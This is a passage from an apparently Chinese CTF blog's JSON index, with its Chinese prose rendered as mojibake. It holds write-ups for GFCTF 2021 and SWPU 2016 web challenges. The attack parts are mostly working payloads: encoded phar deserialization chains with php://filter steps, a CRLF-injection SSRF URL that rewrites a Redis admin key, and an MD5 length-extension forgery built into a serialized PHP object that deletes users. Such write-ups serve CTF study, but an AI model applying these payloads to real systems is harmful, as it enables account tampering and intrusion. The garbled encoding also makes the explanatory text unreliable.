file_put_contents('hacker.txt',quoted_printable_encode($a));//quoted_printableç¼–ç  file_put_contents('hacker.txt',preg_replace('/=\\r /','',file_get_contents('hacker.txt')).'=00=3D');//è§£å†³è½¯æ¢è¡Œå¯¼è‡´çš„ç¼–ç ç»“æ„ç ´å ?&gt; æ³¨ï¼šåœ¨ Quoted-Printable ç¼–ç ä¸­ï¼Œä¸ºäº†é˜²æ­¢ç¼–ç åçš„å­—ç¬¦ä¸²è¿‡é•¿ï¼Œé€šå¸¸ä¼šåœ¨æ¯76ä¸ªå­—ç¬¦åæ’å…¥ä¸€ä¸ªè½¯æ¢è¡Œï¼Œä¹Ÿå°±æ˜¯ = ç¬¦å·åŠ ä¸Šä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ =00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00o=00v=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00D=005=00A=00A=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00T=00z=00o=000=00O=00i=00J=00V=00c=002=00V=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00g=006=00I=00n=00V=00z=00Z=00X=00J=00u=00Y=00W=001=00l=00I=00j=00t=00P=00O=00j=00c=006=00I=00k=001=005=00Z=00X=00J=00y=00b=003=00I=00i=00O=00j=00I=006=00e=003=00M=006=00N=00z=00o=00i=00b=00W=00V=00z=00c=002=00F=00n=00Z=00S=00I=007=00T=00z=00o=001=00O=00i=00J=00G=00a=00W=00x=00l=00c=00y=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=00m=00a=00W=00x=00l=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00M=006=00I=00m=00F=00y=00Z=00y=00I=007=00c=00z=00o=003=00O=00i=00J=00j=00Y=00X=00Q=00g=00L=002=00Y=00q=00I=00j=00t=009=00c=00z=00o=000=00O=00i=00J=000=00Z=00X=00N=000=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00D=00o=00i=00c=00G=00F=00z=00c=003=00d=00v=00c=00m=00Q=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=000=008=006=00N=00D=00o=00i=00V=00X=00N=00l=00c=00i=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=001=00c=002=00V=00y=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00g=006=00I=00n=00B=00h=00c=003=00N=003=00b=003=00J=00k=00I=00j=00t=00O=00O=003=001=00p=00O=00j=00E=007=00c=00z=00o=001=00O=00i=00J=00j=00a=00G=00V=00j=00a=00y=00I=007=00f=00X=001=00p=00O=00j=00A=007=00T=00j=00t=009=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00N=00X=008=008=00m=00U=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00G=00b=00k=003=00N=00T=00L=00f=00N=00E=00j=00w=001=00p=00Y=00r=00c=00c=002=00z=00T=00L=00Y=00E=00x=00V=00b=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00=3D=00=3D ä¹‹åç›´æ¥å¤åˆ¶è¿›å»è®¿é—®log/error.txtï¼Œæ¥ä¸‹æ¥å°±è¦ç”¨åˆ°ä¼ªåè®®å’Œè¿‡æ»¤å™¨ï¼ˆåé¢æ­¥éª¤è¦ç‚¹å‡»é‡å†™æ–‡ä»¶ï¼‰ php://filter/read=consumed/resource=log/error.txt //å¯ä»¥å…ˆç”¨è¿™ä¸ªåˆ é™¤error.txtæ–‡ä»¶å†…å®¹ï¼Œé˜²æ­¢æ–‡ä»¶å†…å®¹è¿‡å¤šé€ æˆåç»­base64è§£ç æŠ¥é”™ è§£ç quoted-printable php://filter/read=convert.quoted-printable-decode/resource=log/error.txt è§£ç UCS-2 php://filter/read=convert.iconv.UCS-2.UTF-8/resource=log/error.txt php://filter/write=convert.base64-decode/resource=log/error.txt phar://log/error.txt è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåˆ°äº†æœ€åä¸€æ­¥æ€»æ˜¯æŠ¥é”™ï¼Œpharä¼¼ä¹ä¸èƒ½ç»•è¿‡ï¼Œæˆ‘é‡‡ç”¨wpçš„ç­”æ¡ˆä¹Ÿä¸è¡Œï¼Œæ„Ÿè§‰æ˜¯ç¯å¢ƒå¯„äº†ã€‚ã€‚ã€‚ ç¬¬äºŒå¤©åˆçœ‹äº†çœ‹ï¼Œç»è¿‡æ–‡ç« çš„ä»”ç»†æ¯”å¯¹å‘ç°payloadä¸ä¸€æ ·ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé™¤äº†ç¬¬äºŒä¸ªï¼Œå…¶ä»–éƒ½æ˜¯æ­£ç¡®çš„ã€‚ è¿™é‡Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä½•ï¼Œé“¾å­è·Ÿå¸ˆå‚…ä»¬æ„Ÿè§‰ä¸€æ ·ï¼Œä½†å°±æ˜¯å‡ºä¸æ¥ï¼Œä¹‹åæ¢ç”¨å¸ˆå‚…ä»¬çš„é“¾å­å‡ºæ¥è¿‡ä¸€æ¬¡ï¼Œä½†æˆ‘è‡ªå·±åŸæ¥çš„å†™æ³•ä¹Ÿæ˜¯ä¸€è‡´çš„æ„Ÿè§‰ï¼Œå¾ˆå¥‡æ€ª è¿™é‡Œæ”¾ä¸ªæœ€ç»ˆçš„payloadå¾—äº†ï¼Œæ„Ÿè§‰æ˜¯ç¯å¢ƒé—®é¢˜ =00R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00q=00N=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00X=00A=00Q=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00T=00z=00o=000=00O=00i=00J=00V=00c=002=00V=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00g=006=00I=00n=00V=00z=00Z=00X=00J=00u=00Y=00W=001=00l=00I=00j=00t=00P=00O=00j=00c=006=00I=00k=001=005=00Z=00X=00J=00y=00b=003=00I=00i=00O=00j=00I=006=00e=003=00M=006=00N=00z=00o=00i=00b=00W=00V=00z=00c=002=00F=00n=00Z=00S=00I=007=00T=00z=00o=001=00O=00i=00J=00G=00a=00W=00x=00l=00c=00y=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=00m=00a=00W=00x=00l=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00M=006=00I=00m=00F=00y=00Z=00y=00I=007=00c=00z=00o=003=00O=00i=00J=00j=00Y=00X=00Q=00g=00L=002=00Y=00q=00I=00j=00t=009=00c=00z=00o=000=00O=00i=00J=000=00Z=00X=00N=000=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00D=00o=00i=00c=00G=00F=00z=00c=003=00d=00v=00c=00m=00Q=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=000=008=006=00N=00D=00o=00i=00V=00X=00N=00l=00c=00i=00I=006=00M=00T=00p=007=00c=00z=00o=004=00O=00i=00J=001=00c=002=00V=00y=00b=00m=00F=00t=00Z=00S=00I=007=00T=00z=00o=003=00O=00i=00J=00N=00e=00W=00V=00y=00c=00m=009=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00c=006=00I=00m=001=00l=00c=003=00N=00h=00Z=002=00U=00i=00O=000=008=006=00N=00T=00o=00i=00R=00m=00l=00s=00Z=00X=00M=00i=00O=00j=00I=006=00e=003=00M=006=00O=00D=00o=00i=00Z=00m=00l=00s=00Z=00W=005=00h=00b=00W=00U=00i=00O=000=004=007=00c=00z=00o=00z=00O=00i=00J=00h=00c=00m=00c=00i=00O=003=00M=006=00N=00z=00o=00i=00Y=002=00F=000=00I=00C=009=00m=00K=00i=00I=007=00f=00X=00M=006=00N=00D=00o=00i=00d=00G=00V=00z=00d=00C=00I=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00a=00T=00o=00x=00O=003=00M=006=00N=00T=00o=00i=00Y=002=00h=00l=00Y=002=00s=00i=00O=003=001=009=00a=00T=00o=00w=00O=000=004=007=00f=00Q=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00s=00A=00A=00A=00C=00L=001=006=00R=00h=00C=00w=00A=00A=00A=00N=00v=00G=00o=00S=00C=002=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00G=00F=00h=00Y=00W=00F=00h=00Y=00W=00F=000=00Z=00X=00N=000=006=00O=00q=00P=00c=004=00H=00F=00K=009=00m=00B=003=00b=00p=00Q=00s=00r=005=00Y=00g=00y=004=00x=00o=00L=00Y=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00=3D å‚è€ƒæ–‡ç«  [GFCTF2021]æ–‡ä»¶æŸ¥çœ‹å™¨å¤ç° [GFCTF 2021]æ–‡ä»¶æŸ¥çœ‹å™¨ GFCTF 2021]æ–‡ä»¶æŸ¥çœ‹å™¨ [SWPU 2016]web7 #!/usr/bin/python # coding:utf8 __author__ = 'niexinming' import cherrypy import urllib2 import redis class web7: @cherrypy.expose def index(self): return \"&lt;script&gt; window.location.href='/input';&lt;/script&gt;\" @cherrypy.expose def input(self,url=\"\",submit=\"\"): file=open(\"index.html\",\"r\").read() reheaders=\"\" if cherrypy.request.method==\"GET\": reheaders=\"\" else: url=cherrypy.request.params[\"url\"] submit=cherrypy.request.params[\"submit\"] try: for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+\"&lt;br&gt;\" except Exception,e: reheaders=\"é”™è¯¯\"+str(e) for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+\"&lt;br&gt;\" file=file.replace(\"&lt;?response?&gt;\",reheaders) return file @cherrypy.expose def login(self,password=\"\",submit=\"\"): pool = redis.ConnectionPool(host='127.0.0.1', port=6379) r = redis.Redis(connection_pool=pool) re=\"\" file=open(\"login.html\",\"r\").read() if cherrypy.request.method==\"GET\": re=\"\" else: password=cherrypy.request.params[\"password\"] submit=cherrypy.request.params[\"submit\"] if r.get(\"admin\")==password: re=open(\"flag\",'r').readline() else: re=\"Can't find admin:\"+password+\",fast fast fast.....\" file=file.replace(\"&lt;?response?&gt;\",re) return file cherrypy.config.update({'server.socket_host': '0.0.0.0', 'server.socket_port': 8080, }) cherrypy.quickstart(web7(),'/') ä»£ç é€»è¾‘ä¹Ÿä¸éš¾ç†è§£ï¼Œé¦–å…ˆæ˜¯å¯¹inputé¡µé¢çš„å¤„ç†ä»–ä¼šæå–åˆ°è¾“å…¥æ¡†ä¸­çš„urlå‚æ•°å†…å®¹ï¼Œæ¥ç€è°ƒç”¨urllib2æ¨¡å—æ‰“å¼€urlï¼Œè·å–å“åº”çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå¹¶è¿”å›é¡µé¢ä¸­ã€‚ å…¶æ¬¡æ˜¯å¯¹loginé¡µé¢çš„å¤„ç†ï¼Œä»–è·å–è¾“å…¥æ¡†ä¸­çš„passwordå‚æ•°å†…å®¹ï¼Œæ¥ç€è¿æ¥redisæ•°æ®åº“ï¼Œå°†è¯¥æ•°æ®åº“ä¸­adminé”®æ‰€å¯¹åº”çš„å€¼ä¸passwordå†…å®¹æ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™å›æ˜¾flagã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è·å–åˆ°redisä¸­adminçš„å€¼ã€‚è¿™é‡Œæˆ‘å½“æ—¶è¿˜ä»¥ä¸ºç”¨ssrfå¸¸è§„æ‰“redisçš„æ€è·¯ï¼Œç›´æ¥gopheråè®®å¹²ï¼Œä½†è¯•ä¸‹æ¥æ²¡å•¥æ•ˆæœï¼Œä¼¼ä¹åªèƒ½ä»¥httpæ¥å¼€å¤´ã€‚éšåçœ‹äº†wpå‘ç°ä¸åœ¨è‡ªå·±çŸ¥è¯†å­˜å‚¨èŒƒå›´å†…ï¼š è¿™é“é¢˜å¯¹æˆ‘æ¥è¯´ä¾æ—§æ˜¯æ–°çŸ¥è¯†ï¼špythonçš„urllib2çš„httpå¤´éƒ¨æ³¨å…¥ æˆ‘ä»¬ä»¥redisæ•°æ®åº“ä¸ºä¾‹ï¼Œå½“å­˜åœ¨SSRFæ—¶æˆ‘ä»¬ä¼ªé€ ä»¥ä¸‹è¯·æ±‚ http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0a:6379/foo è§£ç ä¸€ä¸‹ï¼Œæ‰§è¡Œè¿‡ç¨‹å°±æ˜¯å°†ä¿®æ”¹Redisçš„å·¥ä½œç›®å½•ä¸º /tmpï¼Œç„¶åä¿®æ”¹Redisçš„æ•°æ®åº“æ–‡ä»¶åä¸º evilï¼Œè·¯å¾„ä¸ºé»˜è®¤ç«¯å£çš„/foo http://127.0.0.1 CONFIG SET dir /tmp CONFIG SET dbfilename evil :6379/foo ç„¶åå°±å¯ä»¥æ‰§è¡Œç›¸å…³æ“ä½œï¼Œæ¯”å¦‚ä¿®æ”¹ç”¨æˆ·çš„å¯†ç ã€‚å†æ¬¡åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œä¿®æ”¹å¹¶ä¿å­˜ http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo è§£ç ç»“æœå¦‚ä¸‹ http://127.0.0.1 set admin admin save :6379/foo æœ‰äº†ä¸Šé¢çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ç›´æ¥ä¿®æ”¹redisæ•°æ®åº“çš„å¯†ç å°±è¡Œäº† http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo //è¿™é‡Œå»ºè®®ä¸€ç›´ç‚¹å‡»å‘é€ï¼Œç„¶åå‘é€å®Œï¼Œèµ¶ç´§è¾“å…¥adminå¯†ç ç™»å½• å…·ä½“æ¼æ´åŸç†ï¼Œæˆ‘è®¤ä¸ºå¯å‚è€ƒï¼šCRLF injection urllib2 HTTPå¤´éƒ¨æ³¨å…¥ [SWPU 2016]web400 è¿™é“é¢˜æˆ‘æ˜¯åœ¨æ‰¾ä¸åˆ°æºç æ³„éœ²çš„åœ°æ–¹ã€‚ã€‚ã€‚åªèƒ½çœ‹wpï¼Œcpä¸€ä¸‹äº† //common.php foreach(Array(\"_POST\",\"_GET\",\"_COOKIE\") as $key){ foreach($$key as $k =&gt; $v){ if(is_array($v)){ die(\"hello,hacker!\"); } else{ $k[0] !='_'?$$k = addslashes($v):$$k = \"\"; } } } è¿™é‡Œçœ‹åˆ°$$é…åˆforeachå¯ä»¥æƒ³åˆ°å˜é‡è¦†ç›–ï¼Œè¿™é‡Œtestä¸€ä¸‹çœ‹çœ‹è¦†ç›–é€»è¾‘ &lt;?php foreach(Array(\"_POST\",\"_GET\",\"_COOKIE\") as $key){ foreach($$key as $k =&gt; $v){ if(is_array($v)){ die(\"hello,hacker!\"); } else{ echo $k[0].\" \"; $k[0] !='_'?$$k = addslashes($v):$$k = \"\"; } } } $a=1; echo $a; echo \" \"; echo $b; å½“æˆ‘ä»¬è¾“å…¥ä»¥ä¸Šä»£ç çš„æ—¶å€™ï¼Œæˆ‘ä»¬getä¼ å‚ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾ å¯ä»¥çœ‹åˆ°å·²ç»åˆå§‹åŒ–çš„aå˜é‡æ²¡æœ‰è¢«è¦†ç›–ï¼Œè€Œbæœªåˆå§‹åŒ–ï¼Œä½†è¢«è¦†ç›–ï¼ˆä½†å…‰é æƒ³æˆ‘æƒ³ä¸å‡ºæ¥ä¸ºä½•aæ²¡æœ‰è¢«è¦†ç›–ï¼‰ //riji.php require_once(\"common.php\"); session_start(); if (@$_SESSION['login'] !== 1) //æ£€æµ‹ç™»é™†ï¼Œæ²¡ç™»é™†å°±æ²¡æœ‰ç„¶åäº† { header('Location:/web/index.php'); exit(); } if($_SESSION['user']) { $username = $_SESSION['user']; @mysql_conn(); $sql = \"select * from user where name='$username'\"; $result = @mysql_fetch_array(mysql_query($sql)); //æŸ¥è¯¢ç”¨æˆ· mysql_close(); if($result['userid']) //ç”¨æˆ·ä¸å­˜åœ¨å°±ä¸ä¼šæ‰§è¡Œä¸‹é¢çš„è¯­å¥ï¼Œidå°±ä¸ä¼šåˆå§‹åŒ–äº† { $id = intval($result['userid']); } } else { exit(); } ?&gt; //ä¸­é—´çœç•¥éƒ¨åˆ†htmlä»£ç ï¼Œä¸‹é¢æ˜¯idå…³é”®ä»£ç  &lt;?php @mysql_conn(); $sql1 = \"select * from msg where userid= $id order by id\"; //idå‚æ•°æ²¡æœ‰è¿‡æ»¤ $query = mysql_query($sql1); //ç›´æ¥sqlæ³¨å…¥ $result1 = array(); while($temp=mysql_fetch_assoc($query)) { $result1[]=$temp; } mysql_close(); foreach($result1 as $x=&gt;$o) { echo display($o['msg']); } ?&gt; ä¸Šè¿°ä»£ç ä¼šè·å–å½“å‰ç™»å½•çš„ç”¨æˆ·åï¼Œç„¶åè¿›å…¥æ•°æ®åº“æŸ¥è¯¢è¯¥ç”¨æˆ·çš„useridï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ•´æ•° æ¥ç€å°†å¾—åˆ°çš„useridä¼ å…¥æ•°æ®åº“åœ¨è¿›è¡ŒæŸ¥è¯¢ï¼ˆä½†è¿™ä¸ªuseridæ²¡æœ‰è¢«è¿‡æ»¤ï¼‰ï¼Œè·å–åˆ°ç›¸åº”çš„ç»“æœã€‚å¾ˆæ˜æ˜¾è¿™é‡Œçš„useridæ˜¯ä¸å¯æ§çš„ï¼Œå› ä¸ºuseridæœ¬èº«å°±åœ¨æ•°æ®åº“ä¸­ï¼ˆå·²ç»è¢«åˆå§‹åŒ–ï¼‰ï¼Œæˆ‘ä»¬ç»§ç»­çœ‹ä»£ç ï¼Œçœ‹æ˜¯å¦èƒ½æä¸€äº›ä¸œè¥¿æ¥æ§åˆ¶ä»– åœ¨ api.php ä¸­æœ‰ del_user å‡½æ•°ï¼Œå¯ä»¥åˆ é™¤ç”¨æˆ·ï¼Œä½†æ˜¯éœ€è¦ userid çš„å€¼ //api.php function del_user(){ if($this-&gt;userid){ //éœ€è¦useridä¿¡æ¯æ‰è¡Œ $user_id = intval($this-&gt;userid);//é˜²æ³¨å…¥ if($user_id == 1){ echo('&lt;script&gt;alert(\"Admin can\\'t delete!!\")&lt;/script&gt;'); exit(); } @mysql_conn(); $sql2 = \"DELETE FROM user where userid='$user_id'\"; if(mysql_query($sql2)){ echo('&lt;script&gt;alert(\"Delete user success!!\")&lt;/script&gt;'); exit(); } else{ echo('&lt;script&gt;alert(\"Delete user wrong!!\")&lt;/script&gt;'); exit(); } mysql_close(); } else{ echo('&lt;script&gt;alert(\"Check Your user_id!!\")&lt;/script&gt;'); exit(); } } å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„del_useræ˜¯ä¸€ä¸ªåˆ é™¤ç”¨æˆ·çš„åŠŸèƒ½å‡½æ•°ï¼Œå…ˆåˆ¤æ–­useridæ˜¯å¦å­˜åœ¨ï¼Œç„¶åè½¬ä¸ºæ•´æ•°ï¼Œå¦‚æœç­‰äº1ï¼Œæ˜¾ç¤ºä¸èƒ½åˆ é™¤adminç”¨æˆ·ï¼Œå¦‚æœä¸æ˜¯1çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°é™¤adminä¹‹å¤–ä»»æ„ç”¨æˆ·çš„åˆ é™¤äº† åœ¨ index.php ä¸­å¯ä»¥æ‰¾åˆ° cookie çš„æ‹¼æ¥æ–¹æ³•ï¼Œcookie é‡Œé¢å°±æœ‰ useridï¼Œbase64 è§£ä¸€ä¸‹å°±å¯ä»¥äº† if(@$login==1) { @mysql_conn(); $sql = \"select * from user where name='$username'\"; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if (!empty($result)) { if($result['passwd'] == md5($password)) { $user_cookie = ''; $user_cookie .= $result['userid']; //user_cookieæ‹¼æ¥æ–¹æ³•ï¼Œuserid+name+salt $user_cookie .= $result['name']; $user_cookie .= $result['salt']; $cookies = base64_encode($user_cookie); //æ‹¼æ¥åbase64ç¼–ç å°±æ˜¯cookieäº† //$cookies = $user_cookie; setcookie(\"user\",$cookies,time()+60,'/web/'); $_SESSION['login'] = 1; $_SESSION['user'] = $username; header('Location:/web/riji.php'); } else { echo(\"&lt;script&gt;alert('Password Worng?')&lt;/script&gt;\"); } } else { echo(\"&lt;script&gt;alert('Username Worng?')&lt;/script&gt;\"); } } ä½œè€…æ˜¯ç™»å½•é¡µé¢çš„å¤„ç†ï¼Œå¦‚æœç”¨æˆ·åå­˜åœ¨ï¼Œä¸”å¯¹åº”çš„å¯†ç ä¹Ÿç›¸ç­‰äº†ï¼Œå°±èƒ½ç™»å½•ã€‚ä½†è¿™é‡Œæš´æ¼äº†cookieçš„æ‹¼æ¥æ–¹æ³•ï¼Œå°±æ˜¯çº¯æ˜æ–‡æ‹¼æ¥ï¼Œæ¥ç€base64åŠ å¯†ã€‚ ä¸‹é¢æˆ‘ä»¬å°±è¦åˆ©ç”¨api.phpæä¾›çš„æ¥å£å‡½æ•°ï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶è¢«å½“åšå…¬å…±åº“è¢«åŒ…å«ï¼Œåœ¨api.phpçš„æœ€ä¸‹é¢æ‰¾åˆ°ï¼š $a = unserialize(base64_decode($api)); $a-&gt;do_method(); å…¶ä¸­$apiæ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‚æ•°æ¥æ§åˆ¶adminè¿™ä¸ªç±» del_user å‡½æ•°ä½¿ç”¨å‰ä¼šè°ƒç”¨ check å‡½æ•°æ£€æµ‹æ˜¯å¦æ˜¯ admin ç”¨æˆ·ï¼Œä½†æ˜¯ check å‡½æ•°å­˜åœ¨ hash æ‹“å±•æ”»å‡»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ª hash å®ç° bypass //api.php function check(){ $username = addslashes($this-&gt;name); //è¿›å…¥æ•°æ®åº“çš„æ•°æ®è¿›è¡Œè½¬ä¹‰ @mysql_conn(); $sql = \"select * from user where name='$username'\"; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if(!empty($result)){ //åˆ©ç”¨ salt éªŒè¯æ˜¯å¦ä¸ºè¯¥ç”¨æˆ· if($this-&gt;check === md5($result['salt'] . $this-&gt;data . $username)){ //è¿™é‡Œå­˜åœ¨hashæ‹“å±•æ”»å‡» echo '(=-=)!!'; if($result['role'] == 1){//æ£€æŸ¥æ˜¯å¦ä¸ºadminç”¨æˆ· return 1; } else{ return 0; } } else{ return 0; } } else{ return 0; } } åœ¨ forget.php ä¸­å¯ä»¥æ— æ¡ä»¶è·å–ä»»æ„ç”¨æˆ·åŠ ç›åçš„ hashï¼Œä»è€Œæœ‰äº† hash æ‹“å±•æ”»å‡»çš„åŸææ–™ //forget.php @mysql_conn(); $sql = \"select * from user where name='$username'\"; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if (!empty($result)) { if($result['salt']) { $check = base64_encode(md5($result['salt'])); $name = $result['name']; header(\"Location:/web/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass\"); } else { echo(\"&lt;script&gt;alert('Get salt Worng?')&lt;/script&gt;\"); } } é¦–å…ˆåœ¨forget.phpé¡µé¢ï¼Œè¾“å…¥ç”¨æˆ·adminï¼Œå…¶ä»–éšä¾¿è¾“å…¥ï¼Œæ¥ç€å‘é€ï¼ŒbpæŠ“å–302è·³è½¬ï¼Œä¼šå‘ç°å®ƒæ˜¾ç¤ºå‡ºäº†saltçš„md5åŠ å¯†ç»“æœã€‚å¦‚ä¸‹æ‰€ç¤º /repass.php?username=admin&amp;check=YWI0ZDIyOTI1ZDI2OGRkNjkzN2U0MWVkYmU4MWU5N2U=&amp;mibao=asd&amp;pass=asd //è§£å¯†:ab4d22925d268dd6937e41edbe81e97e åˆ©ç”¨hashæ‹“å±•å·¥å…·ç ´è§£ å¾—åˆ°æ–°hash: æ‹¿åˆ°payloadå’Œç”Ÿæˆå¥½çš„md5ï¼Œç„¶åæ ¹æ®checkçš„æµç¨‹æ„é€ ä¸€ä¸ªè°ƒç”¨é‚£ä¸ªåˆ é™¤ç”¨æˆ·çš„æ¥å£å‡½æ•°ï¼Œä¸‹é¢æ˜¯æ„é€ åˆ é™¤å½“å‰ç”¨æˆ·çš„çš„ä»£ç ï¼š å¯¹äº†ï¼Œè¿™é‡Œé¢è¦ç¡®å®šè¦åˆ é™¤ç”¨æˆ·çš„useridæ˜¯å“ªä¸€ä¸ªï¼Œåœ¨ç”¨æˆ·ç™»é™†çš„è·³è½¬çš„åœ°æ–¹ç”¨burpåœä¸€ä¸‹ï¼Œè¿”å›çš„æ•°æ®é‡Œé¢çš„cookieé‡Œé¢æœ‰å½“å‰ç”¨æˆ·çš„userid(base64åŠ å¯†ä¹‹åçš„æ•°æ®ï¼‰ å¾—åˆ°è¿™äº›ä¹‹åæ„é€ ä»£ç ï¼š &lt;?php class admin { var $name=\"admin\"; var $check=\"6122c04e8a1f3529d556199960ef2556\"; //è¦checkçš„md5 var $data=\"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; //å·¥å…·ç”Ÿæˆå¥½çš„å¯æ§å˜é‡(payload) var $method=\"del_user\"; //è¦è°ƒç”¨çš„å‡½æ•° var $userid=\"2\"; //è¦åˆ é™¤çš„ç”¨æˆ· } $a=new admin(); $api=base64_encode(serialize($a)); echo $api; Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9 æ¥ç€å‘é€å¦‚ä¸‹payloadå³å¯ http://node4.anna.nssctf.cn:28418/api.php?api=Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9 å¦‚ä¸‹å›¾æ‰€ç¤ºåˆ é™¤æˆåŠŸï¼Œidä¹Ÿæˆä¸ºäº†æœªåˆå§‹åŒ–å˜é‡ï¼Œæˆ‘ä»¬ç›´æ¥å¯¹idè¿›è¡Œè”åˆæ³¨å…¥å³å¯ å‚è€ƒæ–‡ç«  SWPU 2017 write-up è¯¦è§£2016 SWPU CTF web4 [GFCTF 2021]A Letter è¿™é“é¢˜æ€€ç–‘ç¯å¢ƒæœ‰é—®é¢˜ã€‚ã€‚ã€‚æ¯•ç«Ÿä¸¤å¹´ä¹‹ä¹…","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"JWTæ”»å‡»å­¦ä¹ ","path":"/2024/02/27/jwt-gong-ji-xue-xi/","content":"0x01 JWTåŸºæœ¬çŸ¥è¯† æœç´¢å¼•æ“ä»‹ç»ï¼ŒJWTæ˜¯Json Web Tokençš„ç¼©å†™ï¼Œä¸»è¦ç”¨äºéªŒè¯ç”¨æˆ·èº«ä»½ä¿¡æ¯åŠè·¨åŸŸçš„èº«ä»½éªŒè¯ã€‚ JWTï¼ˆJSON Web Tokenï¼‰æ˜¯ä¸€ç§å¼€æ”¾æ ‡å‡†ï¼ˆRFC 7519ï¼‰ï¼Œç”¨äºåœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä½œä¸º JSON å¯¹è±¡ä¼ 